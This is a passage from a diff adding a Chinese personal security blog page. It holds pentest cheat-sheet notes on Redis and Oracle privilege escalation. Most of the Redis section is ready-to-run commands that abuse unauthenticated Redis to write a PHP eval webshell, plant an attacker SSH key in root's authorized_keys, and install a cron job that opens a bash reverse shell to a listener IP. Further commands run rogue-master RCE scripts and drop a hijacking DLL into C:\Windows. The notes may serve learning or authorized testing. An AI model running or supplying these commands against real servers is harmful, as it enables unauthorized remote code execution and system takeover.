+<li>通过utl_http.request存储过程提权<br>（1）创建Java包</li>
+</ol>
+<p>（2）创建存储过程MYJAVACMD</p>
+<p>（3）执行存储过程，成功添加用户</p>
+<h2 id="redis提权"><a href="#redis提权" class="headerlink" title="redis提权"></a>redis提权</h2><h3 id="写文件-2"><a href="#写文件-2" class="headerlink" title="写文件"></a>写文件</h3><p>利用redis写webshell(需要知道web的绝对路径)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.111.133</span><br><span class="line">info <span class="comment">#获取redis.conf的绝对路径</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php @eval(<span class="variable">$_POST</span>[shell]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>利用redis写ssh公钥</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 192.168.111.133 -x <span class="built_in">set</span> xxx</span><br><span class="line"><span class="comment">#-x 代表从标准输入读取数据作为该命令的最后一个参数</span></span><br><span class="line">redis-cli -h 192.168.111.133</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>利用redis写计划任务</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.111.133</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.111.128/6666 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h3 id="Redis-主从复制-在Reids-4-x之后使用"><a href="#Redis-主从复制-在Reids-4-x之后使用" class="headerlink" title="Redis 主从复制(在Reids 4.x之后使用)"></a>Redis 主从复制(在Reids 4.x之后使用)</h3><p>写的利用redis的<strong>备份功能</strong>，主从复制利用的是redis <strong>读写分离的机制</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 192.168.111.133 --lhost 192.168.111.1</span><br><span class="line">python3 redis-rce.py -r 192.168.111.133 -L 192.168.111.1 -f exp.so</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Redis在Windows下的利用"><a href="#Redis在Windows下的利用" class="headerlink" title="Redis在Windows下的利用"></a>Redis在Windows下的利用</h3><p>Windows的Redis最新版本还停留在3.2，所以利用主从复制直接getshell没戏<br>其次，写web目录的前提是需要知道web的绝对路径<br>写启动项的话需要机器重启</p>
+<p>利用主从写无损文件dll劫持(Redis&gt;=2.8)<br><code>python3 RedisWriteFile.py --rhost=192.168.56.140 --rport=6379 --lhost=192.168.56.1 --rpath=&quot;C:\Windows&quot; --rfile=&quot;mstlsapi.dll&quot; --lfile=&quot;/tmp/mstlsapiJ.dll&quot;</code></p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/server/"># server</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/08/02/java/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E8%B7%B5/">自动化代码审计实践</a>
+            
+            
+            <a class="next" rel="next" href="/2024/07/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">内网渗透学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
